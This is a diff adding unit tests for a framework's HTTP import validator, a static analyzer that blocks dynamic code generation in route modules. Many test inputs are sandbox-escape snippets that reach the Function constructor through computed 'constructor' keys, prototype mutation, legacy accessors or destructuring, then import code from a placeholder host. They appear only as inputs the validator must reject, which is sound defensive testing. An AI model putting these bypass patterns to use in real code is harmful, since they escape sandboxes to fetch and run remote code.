@@ -1,5 +1,5 @@
 import "#veryfront/schemas/_test-setup.ts";
-import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
+import { assert, assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
 import { describe, it } from "#veryfront/testing/bdd.ts";
 import { dirname, fromFileUrl } from "#veryfront/compat/path";
 import {
@@ -463,6 +463,29 @@ describe("rewriteImportMetaLocations", () => {
 });
 
 describe("routing/api/module-loader/http-validator", () => {
+  it("terminates when a binding is reassigned from a method call on itself", async () => {
+    // `a = a.map(...)` makes the binding's own initializer read `a` again. The
+    // capability analyzer's intrinsic-call probe restarted its walk with a fresh
+    // `seen` set, so it re-entered the binding forever and overflowed the stack,
+    // which failed the handler build for any route importing such a module.
+    const sources = [
+      "export function f() { let a = [1]; a = a.map((o) => o); return a; }",
+      "export function f() { let a = [1]; a = a.slice(0, 2); return a; }",
+      "let a = [1]; a = a.map((o) => o); export const GET = () => Response.json(a);",
+      "export function f(h) { let a = [1]; let b = h - a.reduce((p, o) => p + o, 0);" +
+      " if (b < 1) { a = a.map((o) => o); b = h - a.reduce((p, o) => p + o, 0); } return b; }",
+      // A class whose static method calls itself through the class name.
+      "const X = class C { static f(n) { return n ? C.f(n - 1) : 0; } }; export const GET = () => new Response(String(X.f(2)));",
+      "class D { static g(n) { return n ? D.g(n - 1) : 0; } } export const GET = () => new Response(String(D.g(2)));",
+      "const run = function f(n) { return n ? f(n - 1) : 0; }; export const GET = () => new Response(String(run(2)));",
+    ];
+    for (const source of sources) {
+      const scan = await validateHTTPImports(source, []);
+      assertEquals(scan.specifiers, [], source);
+      assertEquals(scan.hasUnconstrainedDynamicImport, false, source);
+    }
+  });
+
   describe("validateHTTPImports", () => {
     it("should block all remote imports when allowedHosts is empty", async () => {
       await assertRejects(
@@ -1291,6 +1314,453 @@ describe("routing/api/module-loader/http-validator", () => {
           Error,
           "dynamic code generation",
           "global-object destructuring can expose eval, Function, constructor, or an unknown computed key",
+        );
+      }
+    });
+
+    it("should allow unresolved computed keys on values with an intrinsic non-callable prototype", async () => {
+      // `constructor` on an array, string, template or number literal is `Array`,
+      // `String` or `Number`, never `Function`, so an undecidable key cannot reach
+      // a code generator in one hop; a second hop on the result is still rejected.
+      const sources = [
+        `export function f(i) { return ["a", "b"][i]; }`,
+        `const NAMES = ["choice", "score", "noul"];` +
+        " export function f(qtype, k) { return `${NAMES[qtype]}:${k}`; }",
+        `export function f(i) { return "abc"[i]; }`,
+        "export function f(i, x) { return `ab${x}`[i]; }",
+        `export function f(i) { return (42)[i]; }`,
+        `let words = [1, 2]; words = ["x", "y"]; export function f(i) { return words[i]; }`,
+        `export function f(i) { return ["a", "b"]?.[i]; }`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should keep property copies onto literal-backed aliases out of prototype invalidation", async () => {
+      // Every initializer of the target resolves to the same fresh object, so
+      // the copy lands on a tracked object; neither a repeated alias nor a
+      // block-scoped alias of a hoisted `var` may look like an unknown target.
+      const sources = [
+        `const base = {}; let target = base; target = base; const props = { x: 1 };` +
+        ` Object.assign(target, props); export function f(i) { return [1, 2][i]; }`,
+        `{ const base = {}; var target = base; const props = { x: 1 }; Object.assign(target, props); }` +
+        ` export function f(i) { return [1, 2][i]; }`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should resolve long alias chains with repeated initializers in linear time", async () => {
+      let source = "const a0 = {};";
+      for (let i = 1; i <= 40; i++) source += ` let a${i} = a${i - 1}; a${i} = a${i - 1};`;
+      source += " const props = { x: 1 }; Object.assign(a40, props);" +
+        " export function f(i) { return [1, 2][i]; }";
+      const started = performance.now();
+      const scan = await validateHTTPImports(source, []);
+      const elapsed = performance.now() - started;
+      assertEquals(scan.specifiers, []);
+      assert(elapsed < 1_000, `alias chain took ${elapsed.toFixed(0)}ms`);
+    });
+
+    it("should resolve long numeric alias chains with repeated initializers in linear time", async () => {
+      let source = "let a0 = 0;";
+      for (let i = 1; i <= 40; i++) source += ` let a${i} = a${i - 1}; a${i} = a${i - 1};`;
+      source += " const arr = [1, 2]; export function f() { return arr[a40]; }";
+      const started = performance.now();
+      const scan = await validateHTTPImports(source, []);
+      const elapsed = performance.now() - started;
+      assertEquals(scan.specifiers, []);
+      assert(elapsed < 1_000, `numeric alias chain took ${elapsed.toFixed(0)}ms`);
+    });
+
+    it("should not cache a numeric proof that leaned on a binding still being proven", async () => {
+      // Proving `b` first assumes `a` numeric through the cycle; `b` then
+      // turns out to hold a string, so `a` must be re-proven, not remembered.
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `let a = 0; let b = a; a = b; b = ["con", "structor"].join("");` +
+              ` const first = [][b]; const ctor = [][a]; const make = ctor[a]; make("return 1")();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+      );
+    });
+
+    it("should not treat a symbol binding a loop or parameter can overwrite as a symbol key", async () => {
+      const sources = [
+        `let k = Symbol(); const a = []; for (k of ["__proto__"]) a[k] = () => {}; a.constructor("return 1")();`,
+        `let k = Symbol(); const a = []; for (k of ["constructor"]) Object.defineProperty(a, k, { value: 1 });` +
+        ` const r = [].constructor; export const GET = () => new Response(String(r));`,
+        `export function f(k = Symbol()) { const a = []; a[k] = () => {}; return a.constructor("return 1")(); }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+    });
+
+    it("should record assignments through TypeScript wrappers before proving binding values", async () => {
+      const sources = [
+        `let k = 0; (k as any) = "constructor"; const make = (() => {})[k]; make("return 1")();`,
+        `let a = {}; (a as any) = () => {}; const make = a["constructor"]; make("return 1")();`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+    });
+
+    it("should resolve long source alias chains with repeated initializers in linear time", async () => {
+      let source = "const a0 = { x: 1 };";
+      for (let i = 1; i <= 40; i++) source += ` let a${i} = a${i - 1}; a${i} = a${i - 1};`;
+      source += " const out = Object.assign({}, a40); export function f(i) { return [1, 2][i]; }";
+      const started = performance.now();
+      const scan = await validateHTTPImports(source, []);
+      const elapsed = performance.now() - started;
+      assertEquals(scan.specifiers, []);
+      assert(elapsed < 1_000, `source alias chain took ${elapsed.toFixed(0)}ms`);
+    });
+
+    it("should fail closed on property copies whose source cannot be read back to literals", async () => {
+      const sources = [
+        `export function f(make) { const a = []; const props = { constructor: make };` +
+        ` Object.assign(a, props); return a.constructor("return 1")(); }`,
+        `export function f(make) { const a = []; const d = { constructor: { value: make } };` +
+        ` Object.defineProperties(a, d); return a.constructor("return 1")(); }`,
+        `export function f(props) { const a = []; Object.assign(a, props); return a.constructor("return 1")(); }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+    });
+
+    it("should see a mutation through TypeScript wrappers on the target", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `((globalThis as any).Symbol as any) = () => "constructor"; const key = Symbol();` +
+              ` const make = (() => {})[key]; make("return 1")();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+      );
+    });
+
+    it("should treat legacy accessor definitions as prototype writes", async () => {
+      const sources = [
+        `export function f(make) { const arr = []; arr.__defineGetter__("constructor", () => make);` +
+        ` return arr.constructor("return 1")(); }`,
+        `export function f(make) { const arr = []; const d = arr.__defineGetter__;` +
+        ` d.call(arr, "constructor", () => make); return arr.constructor("return 1")(); }`,
+        `export function f(make) { const arr = [];` +
+        ` Object.prototype.__defineGetter__.call(arr, "constructor", () => make);` +
+        ` return arr.constructor("return 1")(); }`,
+        `export function f(make, k) { const arr = []; arr.__defineSetter__(k, () => make);` +
+        ` return arr.constructor("return 1")(); }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+      const safe = await validateHTTPImports(
+        `const arr = []; arr.__defineGetter__("size", () => 1); export function f(k) { return [1, 2][k]; }`,
+        [],
+      );
+      assertEquals(safe.specifiers, []);
+    });
+
+    it("should judge a computed method call it cannot name by its key like an accessor definer", async () => {
+      const sources = [
+        `export function f(make) { const k = ["__define", "Getter__"].join(""); const a = [];` +
+        ` a[k]("constructor", () => make); return a.constructor("return 1")(); }`,
+        `export function f(make, k) { const a = []; a[k].call(a, "constructor", () => make);` +
+        ` return a.constructor("return 1")(); }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+      const safe = await validateHTTPImports(
+        `export function f(k, j) { const a = []; a[k]("size", () => 1); return [1, 2][j]; }`,
+        [],
+      );
+      assertEquals(safe.specifiers, []);
+    });
+
+    it("should keep property definitions with numeric or symbol keys out of prototype invalidation", async () => {
+      const sources = [
+        `const obj = {}; Object.defineProperty(obj, 0, { value: 1 }); export function f(k) { return obj[k]; }`,
+        `const obj = {}; Object.defineProperty(obj, Symbol.iterator, { value: 1 });` +
+        ` export function f(k) { return obj[k]; }`,
+        `const obj = {}; let i = 1; i = i + 1; Reflect.defineProperty(obj, i, { value: 1 });` +
+        ` export function f(k) { return obj[k]; }`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should keep indexed writes with numeric or symbol keys out of prototype invalidation", async () => {
+      // `arr[i] = v` cannot name `__proto__`; it must neither mark `arr` as
+      // prototype-mutated nor switch the module's exemptions off.
+      const sources = [
+        `export function f(k) { const obj = { a: 1 }; const arr = []; let i = 0; arr[i] = 1; return obj[k]; }`,
+        `const out = []; for (let i = 0; i < 3; i += 1) out[i] = i;` +
+        ` export function f(j) { return out[j]; }`,
+        `const out = []; const tag = Symbol("tag"); out[tag] = 1; export function f(j) { return out[j]; }`,
+        `export function f(k) { const obj = { a: 1 }; const arr = []; [arr[0], arr[1]] = [1, 2]; return obj[k]; }`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should still reject constructor reached through an intrinsic literal in two hops", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const key = ["con", "structor"].join("");` +
+              ` const ctor = [][key]; const make = ctor[key];` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "the array constructor is a callable whose constructor is Function",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const key = ["con", "structor"].join("");` +
+              ` const arr = [1]; Object.setPrototypeOf(arr, () => {});` +
+              ` const make = arr[key];` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a prototype mutation revokes the intrinsic-prototype exemption",
+      );
+    });
+
+    it("should allow computed reads whose key is provably numeric", async () => {
+      // A number can never spell "constructor", whatever the object is.
+      const sources = [
+        `export function f(arr) { return arr[0]; }`,
+        `export function f(arr, i) { return arr[i - 1]; }`,
+        `export function f(arr, i) { return arr[+i + 1]; }`,
+        `export function f(arr) { return arr[arr.length - 1]; }`,
+        `export function f(arr) { for (let i = 0; i < arr.length; i += 1) { if (arr[i]) return arr[i]; } }`,
+        `export function f(arr) { for (let i = 0; i < arr.length; i++) { if (arr[i]) return arr[i]; } }`,
+        `export function f(arr, x) { let n = 0; if (x) n = n + 2; return arr[n]; }`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should keep rejecting unresolved computed keys on unknown values", async () => {
+      const sources = [
+        `export function f(arr, k) { return arr[k]; }`,
+        `export function f(arr, k) { return arr[k + 1]; }`,
+        `export function f(arr, k) { let n = 0; n = k; return arr[n]; }`,
+        `export function f(fn, k) { return fn[String(k)]; }`,
+        // Intrinsic namespaces are mutable, so a call on them proves nothing.
+        `export function f(arr, x) { return arr[Math.trunc(x)]; }`,
+        `Math.key = () => "constructor"; const make = (() => {})[Math.key()];` +
+        ` make('return import("https://blocked.example/mod.js")')();`,
+        // Destructuring assignments feed a binding outside its initializers.
+        `let n = 0; ({ n } = { n: "constructor" }); const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')();`,
+        `let n = 0; [n] = ["constructor"]; const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')();`,
+        `let a = []; ({ a } = { a: () => {} });` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `let a = []; [a] = [() => {}]; const key = ["con", "structor"].join("");` +
+        ` a[key]('return import("https://blocked.example/mod.js")')();`,
+        // Loop assignments into an existing binding are not recorded either.
+        `let n = 0; for (n of ["constructor"]) { const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')(); }`,
+        `let n = 0; for (n in { constructor: 1 }) { const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')(); }`,
+        `let n = 0; for ([n] of [["constructor"]]) { const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')(); }`,
+        `let n = 0; for ({ n } of [{ n: "constructor" }]) { const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')(); }`,
+        `let a = []; for (a of [() => {}]) {` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')(); }`,
+        // A `var` loop declaration reuses the outer binding.
+        `var n = 0; for (var n of ["constructor"]) { const make = (() => {})[n];` +
+        ` make('return import("https://blocked.example/mod.js")')(); }`,
+        `var a = []; for (var a of [() => {}]) {` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')(); }`,
+        // A parameter's incoming value precedes every recorded assignment.
+        `export function f(n) { const make = (() => {})[n]; n = 0;` +
+        ` return make('return import("https://blocked.example/mod.js")')(); }`,
+        `export function f(a) { const key = ["con", "structor"].join(""); const make = a[key];` +
+        ` a = []; return make('return import("https://blocked.example/mod.js")')(); }`,
+        `try { throw 0; } catch (n) { const make = (() => {})[n]; n = 0;` +
+        ` make('return import("https://blocked.example/mod.js")')(); }`,
+        `export class C { constructor(private n: unknown) { const make = (() => {})[this.n as string];` +
+        ` this.n = 0; make('return import("https://blocked.example/mod.js")')(); } }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+    });
+
+    it("should read the global object through TypeScript wrappers and typeof", async () => {
+      // `(globalThis as any).x`, `globalThis!.x` and `<any>globalThis` are the
+      // same static member read as `globalThis.x`; `typeof globalThis` yields a
+      // string and cannot hand the object to anything. (Exporting `globalThis.window`
+      // itself still escapes the global object and stays rejected.)
+      const sources = [
+        `export const v = (globalThis as any).document;`,
+        `export const hasCaches = (globalThis as unknown as { caches?: unknown }).caches !== undefined;`,
+        `export const v = (globalThis satisfies object).document;`,
+        `export const v = (<any>globalThis).document;`,
+        `export const v = globalThis!.document;`,
+        `export const v = (window as any).document;`,
+        `export const v = typeof globalThis;`,
+        `export const isBrowser = typeof window !== "undefined";`,
+        `export const isBrowser = typeof (globalThis as any).window !== "undefined";`,
+      ];
+      for (const source of sources) {
+        const scan = await validateHTTPImports(source, []);
+        assertEquals(scan.specifiers, [], source);
+      }
+    });
+
+    it("should keep rejecting the global object escaping as a value or under a computed key", async () => {
+      const sources = [
+        `export function f(g) { return g; } f(globalThis);`,
+        `export const a = [globalThis];`,
+        `export function f(k) { return (globalThis as any)[k]; }`,
+        `export function f(k) { return globalThis![k]; }`,
+        `export function f(k) { const g = globalThis as any; return g[k]; }`,
+        `export function f() { return (globalThis as any).eval; }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
+        );
+      }
+    });
+
+    it("should fail closed on prototype mutations it cannot attribute to a binding", async () => {
+      // `markPrototypeMutation` follows identifier targets only. A mutation
+      // through a member alias or of an intrinsic prototype must switch every
+      // prototype-based exemption off for the module rather than mark nothing.
+      const sources = [
+        `const a = []; const box = { a }; Object.setPrototypeOf(box.a, () => {});` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; const box = { a }; Reflect.set(box.a, "__proto__", () => {});` +
+        ` const key = ["con", "structor"].join("");` +
+        ` a[key]('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; const box = { a }; box.a.__proto__ = () => {};` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `delete Array.prototype.constructor; Object.setPrototypeOf(Array.prototype, () => {});` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        `Object.setPrototypeOf(String.prototype, () => {}); delete String.prototype.constructor;` +
+        ` const key = ["con", "structor"].join("");` +
+        ` "x"[key]('return import("https://blocked.example/mod.js")')();`,
+        `const h = {}; const box = { h }; Object.setPrototypeOf(box.h, () => {});` +
+        ` h.constructor('return import("https://blocked.example/mod.js")')();`,
+        // An identifier target can itself alias a member this walk cannot trace.
+        `const a = []; const box = { a }; const alias = box.a; Object.setPrototypeOf(alias, () => {});` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; const box = { a }; const { a: alias } = box; Object.setPrototypeOf(alias, () => {});` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; function poison(x) { Object.setPrototypeOf(x, () => {}); } poison(a);` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; const pick = () => a; Object.setPrototypeOf(pick(), () => {});` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        // A constructor can return any existing object.
+        `const a = []; function Box() { return a; } Object.setPrototypeOf(new Box(), () => {});` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        // `__proto__` targets nested in patterns and loop heads use the setter.
+        `const a = []; ({ x: a.__proto__ } = { x: () => {} });` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; [a.__proto__] = [() => {}];` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; for (a.__proto__ of [() => {}]) {}` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const a = []; const key = ["__pro", "to__"].join(""); for ({ x: a[key] } of [{ x: () => {} }]) {}` +
+        ` a.constructor('return import("https://blocked.example/mod.js")')();`,
+        // A named function or class expression is its own binding's first value.
+        `const run = function f() { const k = ["con", "structor"].join(""); const make = f[k];` +
+        ` if (false) f = []; return make('return import("https://blocked.example/mod.js")')(); }; run();`,
+        `const C = class K { static run() { const k = ["con", "structor"].join(""); const make = K[k];` +
+        ` if (false) K = []; return make('return import("https://blocked.example/mod.js")')(); } }; C.run();`,
+        // Property-defining intrinsics can replace `constructor` like an assignment.
+        `const local = (s) => s; Object.defineProperty(Array.prototype, "constructor", { value: local });` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; Reflect.defineProperty(String.prototype, "constructor", { value: local });` +
+        ` "x".constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; const h = {}; Object.defineProperties(h, { constructor: { value: local } });` +
+        ` h.constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; Object.assign(Array.prototype, { constructor: local });` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        `const local = (s) => s; const key = ["con", "structor"].join("");` +
+        ` Object.defineProperty(Array.prototype, key, { value: local });` +
+        ` [].constructor('return import("https://blocked.example/mod.js")')();`,
+        // `Reflect.set` writes any key, and a caller-supplied value may be anything.
+        `export function f(make) { Reflect.set(Array.prototype, "constructor", make);` +
+        ` return [].constructor('return import("https://blocked.example/mod.js")')(); }`,
+        `export function f(make) { Reflect.set({}, "constructor", make, Array.prototype);` +
+        ` return [].constructor('return import("https://blocked.example/mod.js")')(); }`,
+        // An identifier target may alias an intrinsic prototype.
+        `export function f(make) { const p = Array.prototype; const props = { constructor: make };` +
+        ` Object.assign(p, props); return [].constructor('return import("https://blocked.example/mod.js")')(); }`,
+        `export function f(make) { const p = String.prototype; const descriptors = { constructor: { value: make } };` +
+        ` Object.defineProperties(p, descriptors);` +
+        ` return "x".constructor('return import("https://blocked.example/mod.js")')(); }`,
+      ];
+      for (const source of sources) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          source,
         );
       }
     });
